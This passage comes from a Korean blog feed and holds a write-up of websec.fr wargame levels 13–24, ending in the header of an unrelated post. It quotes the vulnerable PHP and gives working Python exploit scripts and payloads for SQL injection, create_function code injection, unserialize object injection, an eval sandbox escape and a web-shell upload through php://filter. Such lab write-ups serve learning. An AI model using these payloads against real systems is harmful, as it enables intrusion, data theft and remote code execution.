class="variable">$tmp</span>[<span class="variable">$i</span>] &lt; <span class="number">1</span> ) &#123;</span><br><span class="line">          <span class="keyword">unset</span>(<span class="variable">$tmp</span>[<span class="variable">$i</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이 부분을 보면 explode를 하고나서 for문을 돌리는데 여기서</p><p>$tmp 부분을 고정으로 사용하지 않고 반복문이 돌때마다 다시 저장해주고 있다.</p><p>$tmp[i] &lt; 1 부분에서 1보다 작은 값이 들어가게 된다면 unset를 수행하게 되는데</p><p>이 떼 반복문에 도는 count 함수의 반환 값은 처음에 실행되었을 때의 값이랑 달라지게 된다.</p><p>그 점을 보면 정수형이 아닌 문자들이 값으로 들어오기 때문에 이 취약점을 이용해 문제를 풀이할 수 있다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span>(<span class="params">data</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://websec.fr/level13/index.php&quot;</span></span><br><span class="line">    param = &#123;<span class="string">&#x27;ids&#x27;</span>:data,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;Go&#x27;</span>&#125;</span><br><span class="line">    r = requests.get(url, params=param)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> r.text</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;0,0,0,0)) union select user_password,user_name,3 from users--&#x27;</span></span><br><span class="line">submit(data)</span><br></pre></td></tr></table></figure><hr><h3 id="6-LEVEL-15"><a href="#6-LEVEL-15" class="headerlink" title="6. LEVEL 15"></a>6. LEVEL 15</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;error_reporting&#x27;</span>, E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="variable">$success</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;div class=&quot;alert alert-success alert-dismissible&quot; role=&quot;alert&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot; aria-label=&quot;Close&quot;&gt;&lt;span aria-hidden=&quot;true&quot;&gt;&amp;times;&lt;/span&gt;&lt;/button&gt;</span></span><br><span class="line"><span class="string">    Function declared.</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$fun</span> = create_function(<span class="string">&#x27;$flag&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$success</span>);</span><br><span class="line">    <span class="comment">//fun($flag);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;q&#x27;</span>] == <span class="string">&#x27;checked&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>c라는 변수에 우리가 임의로 값을 입력할 수 있다.</p><p>입력한 값이 create_function 함수를 거쳐 $fun 변수에 저장되고,</p><p>이후 $success 함수에 정의된 내용을 출력해준다.</p><p>취약점 관련해서 자료를 찾아 보다가 RCE 취약점이 있음을 알 수 있었다.</p><p>관련 자료는 해당 포스팅이 끝나고 별도로 업로드 할 예정이니 아래 링크를 참고하자.</p><p>함수를 만들어 줄때 보면 $_POST[‘c’] 와 같이 두번째 인자를 임의로 조작할 수 있다.</p><p>이 부분을 이용해서 RCE 취약점을 발생시켜 플래그를 얻을 수 있다.</p><p>return% -1;} show_source(“flag.php”); /*</p><ul><li>참고 : <a href="https://blog.jhyeon.xyz/category/docx/function_rce/">https://blog.jhyeon.xyz/category/docx/function_rce/</a></li></ul><hr><h3 id="8-LEVEL-20"><a href="#8-LEVEL-20" class="headerlink" title="8. LEVEL 20"></a>8. LEVEL 20</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* i0n1c&#x27;s bypass won&#x27;t save you this time! (https://www.exploit-db.com/exploits/22547/) */</span></span><br><span class="line">    <span class="keyword">if</span> ( ! preg_match (<span class="string">&#x27;/[A-Z]:/&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> unserialize (<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! preg_match (<span class="string">&#x27;/(^|;|&#123;|&#125;)O:[0-9+]+:&quot;/&#x27;</span>, <span class="variable">$data</span> )) &#123;</span><br><span class="line">        <span class="keyword">return</span> unserialize (<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">Array</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> = sanitize (base64_decode (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;value&#x27;</span>]) <span class="keyword">and</span> ! <span class="keyword">empty</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;value&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">/* Add a value twice to remove it from the list. */</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$key</span> = array_search (<span class="variable">$_POST</span>[<span class="string">&#x27;value&#x27;</span>], <span class="variable">$data</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">unset</span> (<span class="variable">$data</span>[<span class="variable">$key</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">/* Else, simply add it. */</span></span><br><span class="line">        array_push (<span class="variable">$data</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie (<span class="string">&#x27;data&#x27;</span>, base64_encode (serialize (<span class="variable">$data</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PHP Object Injection 문제가 다시 돌아왔다.</p><p>소스코드를 분석해보면 일단 data 라는 쿠키에 serialize 된 값을 넣어주는 것으로 보아</p><p>class Flag 객체를 serialize 해서 넣어주면 된다.</p><p>그런데 data 값에 O:4:’Flag’ 이런식으로 넣어주는 데 이 구문이 필터링되서 사용을 못한다.</p><p>exploit-db 사이트를 주면서 O:+15 이런식의 bypass도 봤는데 이것도 사용이 안된다.</p><p>그래서 삽질을 좀 해본 결과로,, 아래 블로그를 찾아서 해결할 수 있었는데</p><ul><li><a href="https://www.evonide.com/fuzzing-unserialize/">https://www.evonide.com/fuzzing-unserialize/</a></li></ul><p>case C의 경우와 O의 경우에 같은 분기로 넘어가게 된다.</p><p>여기서 그러면 C:4:’Flag’ 이런식으로 써줄 수 있지 않을까 하고 테스트 해보니 잘 작동된다.</p><p>아래 구문을 serialize -&gt; base64 encode 방식을 써서 쿠키값을 넣어면 플래그를 준다.</p><p>serialize : C:4:’Flag’:0:{}</p><p>serialize(base64) -&gt; Qzo0OuKAmUZsYWfigJk6MDp7fQ==</p><hr><h3 id="9-LEVEL-22"><a href="#9-LEVEL-22" class="headerlink" title="9. LEVEL 22"></a>9. LEVEL 22</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pub</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pro</span> ;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pri</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$pub</span>, <span class="variable">$pro</span>, <span class="variable">$pri</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pub = <span class="variable">$pub</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pro = <span class="variable">$pro</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pri = <span class="variable">$pri</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;file_containing_the_flag_parts.php&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A(<span class="variable">$f1</span>, <span class="variable">$f2</span>, <span class="variable">$f3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$f1</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$f2</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$f3</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$funcs_internal</span> = get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* lets allow some secure funcs here */</span></span><br><span class="line"><span class="keyword">unset</span> (<span class="variable">$funcs_internal</span>[array_search(<span class="string">&#x27;strlen&#x27;</span>, <span class="variable">$funcs_internal</span>)]);</span><br><span class="line"><span class="keyword">unset</span> (<span class="variable">$funcs_internal</span>[array_search(<span class="string">&#x27;print&#x27;</span>, <span class="variable">$funcs_internal</span>)]);</span><br><span class="line"><span class="keyword">unset</span> (<span class="variable">$funcs_internal</span>[array_search(<span class="string">&#x27;strcmp&#x27;</span>, <span class="variable">$funcs_internal</span>)]);</span><br><span class="line"><span class="keyword">unset</span> (<span class="variable">$funcs_internal</span>[array_search(<span class="string">&#x27;strncmp&#x27;</span>, <span class="variable">$funcs_internal</span>)]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$funcs_extra</span> = <span class="keyword">array</span> (<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;include&#x27;</span>, <span class="string">&#x27;require&#x27;</span>, <span class="string">&#x27;function&#x27;</span>);</span><br><span class="line"><span class="variable">$funny_chars</span> = <span class="keyword">array</span> (<span class="string">&#x27;\.&#x27;</span>, <span class="string">&#x27;\+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>);</span><br><span class="line"><span class="variable">$variables</span> = <span class="keyword">array</span> (<span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>, <span class="string">&#x27;_REQUEST&#x27;</span>, <span class="string">&#x27;_SERVER&#x27;</span>, <span class="string">&#x27;_FILES&#x27;</span>, <span class="string">&#x27;_ENV&#x27;</span>, <span class="string">&#x27;HTTP_ENV_VARS&#x27;</span>, <span class="string">&#x27;_SESSION&#x27;</span>, <span class="string">&#x27;GLOBALS&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$blacklist</span> = array_merge(<span class="variable">$funcs_internal</span>, <span class="variable">$funcs_extra</span>, <span class="variable">$funny_chars</span>, <span class="variable">$variables</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$insecure</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blacklisted</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blacklisted</span> . <span class="string">&#x27;/im&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="variable">$insecure</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$insecure</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Insecure code detected!&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">eval</span> (<span class="string">&quot;echo <span class="subst">$code</span>;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>먼저 $code 변수에는 임의로 값을 넣어 eval($code) 형식으로 실행 시킬 수 있다.</p><p>php sandbox형 문제인데, 처음에 생각한 방법이 $blacklist에 정의된 배열을 뽑아내서 플래그를 볼려고 했다.</p><p>근데 길이 제한이 21자 이기 때문에 페이로드가 길어지면 사용이 불가능하다. (심지어 플래그 파일명이 졸라 길다)</p><p>하지만 또 이상한 부분이 있다.</p><p>a 객체를 만들어주고 unset 해주는 부분을 볼 수 있는데, 이 객체를 사용해서 var_dump로 출력을 찍어내서 보면 플래그가 있다.</p><p>위 과정들을 손수 하기에는 아~주 귀찮아서 파이썬으로 짜서 풀었다.</p><p>배열 내에서 var_dump() 함수 찾는게 좀 노가다 인데.. 그냥 좀 기다리면 된다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        blacklist = <span class="string">&#x27;$blacklist&#123;&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;&#125;($a)&#x27;</span></span><br><span class="line">        url = <span class="string">&#x27;https://websec.fr/level22/index.php&#x27;</span></span><br><span class="line">        param = &#123;<span class="string">&#x27;code&#x27;</span>:blacklist, <span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;a&#x27;</span>&#125;</span><br><span class="line">        r = requests.get(url, params=param)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;WEBSEC&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span> r.text</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;sending payload&quot;</span>+blacklist</span><br><span class="line">read()</span><br></pre></td></tr></table></figure><hr><h3 id="10-LEVEL-24"><a href="#10-LEVEL-24" class="headerlink" title="10. LEVEL 24"></a>10. LEVEL 24</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;error_reporting&#x27;</span>, E_ALL);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;clean_up.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* periodic cleanup */</span></span><br><span class="line"><span class="keyword">foreach</span> (glob(<span class="string">&quot;./uploads/*&quot;</span>) <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_file(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (time() - filemtime(<span class="variable">$file</span>) &gt;= <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>) &#123;</span><br><span class="line">            Delete(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$upload_dir</span> = sprintf(<span class="string">&quot;./uploads/%s/&quot;</span>, session_id());</span><br><span class="line">@mkdir(<span class="variable">$upload_dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* sandboxing ! */</span></span><br><span class="line">chdir(<span class="variable">$upload_dir</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;list&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>] === <span class="string">&quot;edit&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="string">&quot;edit&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$data</span>, <span class="string">&#x27;&lt;?&#x27;</span>)  === <span class="literal">false</span> &amp;&amp; stripos(<span class="variable">$data</span>, <span class="string">&#x27;script&#x27;</span>)  === <span class="literal">false</span>) &#123;  <span class="comment"># no interpretable code please.</span></span><br><span class="line">                file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$data</span>);</span><br><span class="line">                <span class="keyword">die</span> (<span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=.&quot;&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (file_exists(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$data</span> = file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>파일 업로드 문제이다. 웹 쉘을 업로드 해서 간단히 문제를 해결할 수 있지만,</p><p>파일 내용에 &lt;? 이 못들어가도록 php 코드 실행을 허술(?) 하게 막고 있다.</p><p>이는 php wrapper인 base64 en/decode 방식을 사용하면 된다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#import requests</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;shell.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session</span>(<span class="params">sess</span>):</span></span><br><span class="line">    url = sess.get(<span class="string">&#x27;https://websec.fr/level24/index.php&#x27;</span>)</span><br><span class="line">    session_key = url.cookies.get_dict()[<span class="string">&#x27;PHPSESSID&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> session_key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;?php echo file_get_contents(&#x27;../../flag.php&#x27;); ?&gt;&quot;</span>.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">sess</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;php://filter/convert.base64-decode/resource=&#x27;</span>+filename</span><br><span class="line">    url = <span class="string">&#x27;https://websec.fr/level24/index.php?p=edit&amp;filename=&#x27;</span>+payload</span><br><span class="line">    data = &#123;<span class="string">&#x27;filename&#x27;</span>: payload, <span class="string">&#x27;data&#x27;</span>: shell()&#125;</span><br><span class="line">    req = sess.post(url, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span>(<span class="params">sess, session_key</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;https://websec.fr/level24/uploads/&#x27;</span>+session_key+<span class="string">&#x27;/&#x27;</span>+filename</span><br><span class="line">    r = sess.get(url)</span><br><span class="line">    <span class="built_in">print</span> url</span><br><span class="line">    <span class="built_in">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    session_key = session(sess)</span><br><span class="line">    exploit(sess)</span><br><span class="line">    execute(sess, session_key)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>세션값이 실행 시마다 변경되기 때문에 같은 방법으로 실행 때 마다 새 세션을 구해줘야 하는데,</p><p>이 부분에서 세션키를 얻는 과정이 갑자기 생각안나서 한 2시간 잡고있었던 것 같다..</p><p>풀면서 느낀거지만, 파이썬 언어 연습좀 더 해야겠다.</p>]]></content>
      
      
      <categories>
          
          <category> Wargame </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> websec.fr </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BOB 8기 서류 &amp; 면접 후기</title>
      <link href="2020/05/10/bob8th-200510/"/>
      <url>2020/05/10/bob8th-200510/</url>
      
